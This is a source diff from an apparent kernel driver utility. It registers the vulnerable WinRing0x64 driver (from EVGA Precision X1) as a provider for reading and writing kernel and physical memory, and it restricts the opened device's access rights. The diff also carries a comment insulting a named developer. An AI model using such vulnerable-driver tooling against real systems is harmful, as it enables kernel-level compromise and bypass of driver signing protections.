@@ -1,4 +1,4 @@
-/*******************************************************************************
+﻿/*******************************************************************************
 *
 *  (C) COPYRIGHT AUTHORS, 2020
 *
@@ -6,7 +6,7 @@
 *
 *  VERSION:     1.01
 *
-*  DATE:        12 Feb 2020
+*  DATE:        13 Feb 2020
 *
 *  Vulnerable driver providers routines.
 *
@@ -23,6 +23,7 @@
 #include "idrv/gdrv.h"
 #include "idrv/atszio.h"
 #include "idrv/winio.h"
+#include "idrv/winring0.h"
 
 //
 // Since we have a lot of them, make an abstraction layer.
@@ -175,6 +176,27 @@ KDU_PROVIDER g_KDUProviders[KDU_PROVIDERS_MAX] =
         WinIoQueryPML4Value,
         WinIoReadPhysicalMemory,
         WinIoWritePhysicalMemory
+     },
+
+     {
+        16299,
+        IDR_WINRING0,
+        KDUPROV_FLAGS_WINRING0_BASED,
+        (LPWSTR)L"EVGA Precision X1",
+        (LPWSTR)L"WinRing0x64",
+        (LPWSTR)L"WinRing0_1_2_0",
+        (LPWSTR)L"EVGA",
+        (provRegisterDriver)KDUProviderStub,
+        (provUnregisterDriver)KDUProviderStub,
+        (provAllocateKernelVM)KDUProviderStub,
+        (provFreeKernelVM)KDUProviderStub,
+        WRZeroReadKernelVirtualMemory,
+        WRZeroKernelVirtualMemory,
+        WRZeroVirtualToPhysical,
+        (provReadControlRegister)KDUProviderStub,
+        WRZeroQueryPML4Value,
+        WRZeroReadPhysicalMemory,
+        WRZeroWritePhysicalMemory,
      }
 };
 
@@ -212,10 +234,12 @@ VOID KDUProvList()
         //
         printf_s("\tHVCI support: %s\r\n"\
             "\tWHQL signature present: %s\r\n"\
-            "\tWinIO based: %s\r\n",
+            "\tWinIO based: %s\r\n"\
+            "\tWinRing0 based: %s\r\n",
             (prov->SupportHVCI == 0) ? "No" : "Yes",
             (prov->SignatureWHQL == 0) ? "No" : "Yes",
-            (prov->WinIoBased == 0) ? "No" : "Yes");
+            (prov->WinIoBased == 0) ? "No" : "Yes",
+            (prov->WinRing0Based == 0) ? "No" : "Yes");
 
         //
         // Maximum support Windows build.
@@ -224,7 +248,7 @@ VOID KDUProvList()
             printf_s("\tMaximum Windows build undefined, no restrictions\r\n");
         }
         else {
-            printf_s("\tMaximum supported Windows build: 0x%lX\r\n",
+            printf_s("\tMaximum supported Windows build: %lu\r\n",
                 prov->MaxNtBuildNumberSupport);
         }
 
@@ -302,11 +326,42 @@ HANDLE KDUProvStartVulnerableDriver(
     }
 
     if (bLoaded) {
-        ntStatus = supOpenDriver(lpDeviceName, &deviceHandle);
+        ntStatus = supOpenDriver(lpDeviceName, WRITE_DAC | GENERIC_WRITE | GENERIC_READ, &deviceHandle);
         if (!NT_SUCCESS(ntStatus))
             printf_s("[!] Unable to open vulnerable driver, NTSTATUS (0x%lX)\r\n", ntStatus);
-        else
+        else {
+
+            //
+            // At least make less mess.
+            // However if driver author is an idiot just like Unwinder, it won't much help.
+            //
+            PSECURITY_DESCRIPTOR driverSD = NULL;
+            ULONG size;
+
+            if (NT_SUCCESS(supCreateSystemAdminAccessSD(&driverSD, &size))) {
+                NtSetSecurityObject(deviceHandle, DACL_SECURITY_INFORMATION, driverSD);
+                supHeapFree(driverSD);
+            }
+
+            //
+            // Remove WRITE_DAC from result handle.
+            //
+            HANDLE strHandle;
+
+            if (NT_SUCCESS(NtDuplicateObject(NtCurrentProcess(),
+                deviceHandle,
+                NtCurrentProcess(),
+                &strHandle,
+                GENERIC_WRITE | GENERIC_READ,
+                0,
+                0)))
+            {
+                NtClose(deviceHandle);
+                deviceHandle = strHandle;
+            }
+
             printf_s("[+] Vulnerable driver opened\r\n");
+        }
     }
     return deviceHandle;
 }
